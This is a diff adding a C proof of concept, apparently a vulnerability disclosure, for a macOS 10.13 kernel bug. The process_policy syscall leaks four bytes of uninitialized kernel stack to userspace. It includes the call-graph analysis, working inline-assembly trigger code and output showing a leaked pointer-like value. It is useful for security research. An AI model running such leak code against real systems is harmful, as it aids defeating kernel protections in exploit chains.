@@ -1,0 +1,84 @@
+/*
+The syscall
+process_policy(scope=PROC_POLICY_SCOPE_PROCESS, action=PROC_POLICY_ACTION_GET, policy=PROC_POLICY_RESOURCE_USAGE, policy_subtype=PROC_POLICY_RUSAGE_CPU, attrp=<userbuf>, target_pid=0, target_threadid=<ignored>)
+causes 4 bytes of uninitialized kernel stack memory to be written to userspace.
+
+The call graph looks as follows:
+
+process_policy
+  handle_cpuuse
+    proc_get_task_ruse_cpu
+      task_get_cpuusage
+        [writes scope=1/2/4/0]
+        [always returns zero]
+      [writes policyp if scope!=0]
+      [always returns zero]
+    copyout
+
+
+If task_get_cpuusage() set `*scope=0` because none of the flags
+TASK_RUSECPU_FLAGS_PERTHR_LIMIT, TASK_RUSECPU_FLAGS_PROC_LIMIT and TASK_RUSECPU_FLAGS_DEADLINE are set in task->rusage_cpu_flags,
+proc_get_task_ruse_cpu() does not write anything into `*policyp`, meaning that `cpuattr.ppattr_cpu_attr` in
+handle_cpuuse() remains uninitialized. task_get_cpuusage() and proc_get_task_ruse_cpu() always return zero,
+so handle_cpuuse() will copy `cpuattr`, including the unititialized `ppattr_cpu_attr` field, to userspace.
+
+
+Tested on a Macmini7,1 running macOS 10.13 (17A405), Darwin 17.0.0:
+
+$ cat test.c
+*/
+
+#include <stdint.h>
+#include <stdio.h>
+#include <inttypes.h>
+
+struct proc_policy_cpuusage_attr {
+  uint32_t ppattr_cpu_attr;
+  uint32_t ppattr_cpu_percentage;
+  uint64_t ppattr_cpu_attr_interval;
+  uint64_t ppattr_cpu_attr_deadline;
+};
+
+void run(void) {
+  int retval;
+  struct proc_policy_cpuusage_attr attrs = {0,0,0,0};
+  asm volatile(
+    "mov $0x02000143, %%rax\n\t" // process_policy
+    "mov $1, %%rdi\n\t"   // PROC_POLICY_SCOPE_PROCESS
+    "mov $11, %%rsi\n\t"  // PROC_POLICY_ACTION_GET
+    "mov $4, %%rdx\n\t"   // PROC_POLICY_RESOURCE_USAGE
+    "mov $3, %%r10\n\t"   // PROC_POLICY_RUSAGE_CPU
+    "mov %[userptr], %%r8\n\t"
+    "mov $0, %%r9\n\t"    // PID 0 (self)
+    // target_threadid is unused
+    "syscall\n\t"
+  : //out
+    "=a"(retval)
+  : //in
+    [userptr] "r"(&attrs)
+  : //clobber
+    "cc", "memory", "rdi", "rsi", "rdx", "r10", "r8", "r9"
+  );
+  printf("retval = %d\n", retval);
+  printf("ppattr_cpu_attr = 0x%"PRIx32"\n", attrs.ppattr_cpu_attr);
+  printf("ppattr_cpu_percentage = 0x%"PRIx32"\n", attrs.ppattr_cpu_percentage);
+  printf("ppattr_cpu_attr_interval = 0x%"PRIx64"\n", attrs.ppattr_cpu_attr_interval);
+  printf("ppattr_cpu_attr_deadline = 0x%"PRIx64"\n", attrs.ppattr_cpu_attr_deadline);
+}
+
+int main(void) {
+  run();
+  return 0;
+}
+
+/*
+$ gcc -Wall -o test test.c
+$ ./test
+retval = 0
+ppattr_cpu_attr = 0x1a180ccb
+ppattr_cpu_percentage = 0x0
+ppattr_cpu_attr_interval = 0x0
+ppattr_cpu_attr_deadline = 0x0
+
+That looks like the lower half of a pointer or so.
+*/
